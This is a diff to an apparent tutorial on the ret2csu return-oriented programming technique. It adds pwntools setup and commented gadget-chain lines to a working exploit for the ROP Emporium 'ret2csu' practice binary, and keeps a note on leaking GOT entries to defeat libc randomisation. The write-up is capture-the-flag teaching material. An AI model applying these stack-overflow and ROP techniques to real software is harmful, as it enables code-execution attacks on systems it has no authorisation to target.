@@ -12,6 +12,7 @@ Tests programs done on an AMD64 Linux Ubuntu
 <li><a href="#sec-3">Why dis?</a></li>
 <li><a href="#sec-4">How even?</a></li>
 <li><a href="#sec-5">But still.. how?</a></li>
+<li><a href="#sec-6">In practice would you??</a></li>
 </ul>
 </div>
 </div>
@@ -238,7 +239,7 @@ For de-randomizing libc, one can use &GOT_TABLE, coupled with some read(), write
 
 *ie: calling write@plt(fd, &GOT_TABLE[1], 8) to write to fd the first entry of the GOT_TABLE, leading in derandomizing libc*
 
-## In practice would you?
+## In practice would you??<a id="sec-6" name="sec-6"></a>
 
 ***ROP Emporium - ret2csu***
 
@@ -247,6 +248,12 @@ Binaries provided.
 call ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) to get a flag.
 
 ```python
+#!/usr/bin/python
+
+from pwn import *
+context.update(os='linux',arch='amd64',bits=64,endian='little')
+p = process('ret2csu')
+
 init = 0x600e38
 win = 0x400510
 pop_rdi = 0x4006a3
@@ -268,24 +275,22 @@ def ret2csu(call,rdi,rsi,rdx):
 	payload += p64(0x00)            # r13
 	payload += p64(0x00)            # r14
 	payload += p64(0x00)            # r15
-	payload += p64(pop_rdi)
-	payload += p64(rdi)
-	payload += p64(ret)
-	payload += p64(call)
+	payload += p64(pop_rdi)         # transfer control to pop rdi; ret; gadget
+	payload += p64(rdi)				# update rdi with correct unconstrained content
+	payload += p64(ret)				# return gadget; jmp to address
+	payload += p64(call)		    # actual wanted function call
 	return payload
 
 
 payload = ret2csu(win, 0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) # call(rdi,rsi,rdx)
 
-eip = b'A'*40 # 32 bytes array size, 4 , 4 ,
+eip = b'A'*40 # 32 bytes array size, 8 overwrite saved RBP
 rop = eip + payload
 
 p.recvuntil('> ')
 p.sendline(rop)
 print(p.recvallS())
 ```
-
-
 
 
 ## References:
